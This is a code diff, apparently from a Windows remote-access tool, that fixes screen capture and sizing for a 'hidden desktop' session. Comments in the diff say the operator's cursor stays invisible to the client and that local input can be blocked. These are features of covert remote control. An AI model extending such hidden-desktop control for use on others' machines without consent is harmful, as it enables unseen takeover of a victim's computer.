@@ -125,6 +125,10 @@ if platform.system() == "Windows":
     user32.GetWindowDC.restype = wintypes.HDC
     user32.ReleaseDC.argtypes = [wintypes.HWND, wintypes.HDC]
     user32.ReleaseDC.restype = wintypes.INT
+    user32.GetDC.argtypes = [wintypes.HWND]
+    user32.GetDC.restype = wintypes.HDC
+    user32.GetSystemMetrics.argtypes = [wintypes.INT]
+    user32.GetSystemMetrics.restype = wintypes.INT
 
     gdi32.CreateCompatibleDC.argtypes = [wintypes.HDC]
     gdi32.CreateCompatibleDC.restype = wintypes.HDC
@@ -270,27 +274,60 @@ def _toggle_block_input(enabled: bool) -> bool:
         return False
 
 
+def _get_screen_size() -> tuple[int, int]:
+    """Get primary screen size using GetSystemMetrics."""
+    SM_CXSCREEN = 0
+    SM_CYSCREEN = 1
+    try:
+        width = user32.GetSystemMetrics(SM_CXSCREEN)
+        height = user32.GetSystemMetrics(SM_CYSCREEN)
+        if width > 0 and height > 0:
+            return width, height
+    except Exception:
+        pass
+    return 1920, 1080  # Fallback
+
+
 def _open_hidden_desktop_dc(desktop_path: str | None):
-    if not desktop_path:
-        return None, 0, 0, None
+    """
+    Get DC for capturing the hidden desktop.
+    
+    After SetThreadDesktop is called, GetDC(NULL) returns the DC
+    for the current thread's desktop (which is the hidden desktop).
+    """
+    # Method 1: Try GetDC(NULL) - works after SetThreadDesktop
+    hdc = user32.GetDC(None)
+    if hdc:
+        width = int(gdi32.GetDeviceCaps(hdc, HORZRES))
+        height = int(gdi32.GetDeviceCaps(hdc, VERTRES))
+        if width > 0 and height > 0:
+            def _cleanup() -> None:
+                try:
+                    user32.ReleaseDC(None, hdc)
+                except Exception:
+                    pass
+            logger.info("Hidden desktop: DC opened via GetDC(NULL), size=%dx%d", width, height)
+            return hdc, width, height, _cleanup
+        user32.ReleaseDC(None, hdc)
+    
+    # Method 2: Try CreateDC with DISPLAY
     create_dc = getattr(gdi32, "CreateDCW", None)
-    if create_dc is None:
-        return None, 0, 0, None
-    hdc = create_dc(desktop_path, None, None, None)
-    if not hdc:
-        hdc = create_dc("DISPLAY", desktop_path, None, None)
-    if not hdc:
-        return None, 0, 0, None
-    width = int(gdi32.GetDeviceCaps(hdc, HORZRES))
-    height = int(gdi32.GetDeviceCaps(hdc, VERTRES))
-
-    def _cleanup() -> None:
-        try:
+    if create_dc:
+        hdc = create_dc("DISPLAY", None, None, None)
+        if hdc:
+            width = int(gdi32.GetDeviceCaps(hdc, HORZRES))
+            height = int(gdi32.GetDeviceCaps(hdc, VERTRES))
+            if width > 0 and height > 0:
+                def _cleanup() -> None:
+                    try:
+                        gdi32.DeleteDC(hdc)
+                    except Exception:
+                        pass
+                logger.info("Hidden desktop: DC opened via CreateDC(DISPLAY), size=%dx%d", width, height)
+                return hdc, width, height, _cleanup
             gdi32.DeleteDC(hdc)
-        except Exception:
-            return
-
-    return hdc, width, height, _cleanup
+    
+    return None, 0, 0, None
 
 
 class HiddenDesktopCapture:
@@ -672,6 +709,9 @@ class HiddenDesktopSession:
             fps = 30
         
         self._start_shell()
+        
+        # Wait for shell to initialize on hidden desktop
+        time.sleep(0.5)
 
         # Capture WITHOUT cursor drawing - operator cursor stays invisible to client
         self._capture = HiddenDesktopCapture(
@@ -680,14 +720,22 @@ class HiddenDesktopSession:
             draw_cursor=False,  # Critical: operator cursor not visible to client
             fps=fps,
         )
+        
+        # Wait for capture to get first frame
         size = self._capture.frame_size
-        deadline = time.monotonic() + 1.0
+        deadline = time.monotonic() + 3.0  # Increased timeout
         while size == (0, 0) and time.monotonic() < deadline:
-            time.sleep(0.05)
+            time.sleep(0.1)
             size = self._capture.frame_size
+        
+        if size == (0, 0):
+            # Fallback to screen size
+            size = _get_screen_size()
+            logger.warning("Hidden desktop: using fallback screen size %dx%d", size[0], size[1])
         
         self.screen_track = HiddenDesktopTrack(self._capture, profile="balanced")
         self.input_controller = HiddenDesktopInputController(self._desktop_handle, size)
+        logger.info("Hidden desktop session initialized: %s, size=%dx%d", self._desktop_name, size[0], size[1])
         
         if self._block_local_input:
             self.set_input_blocking(True)
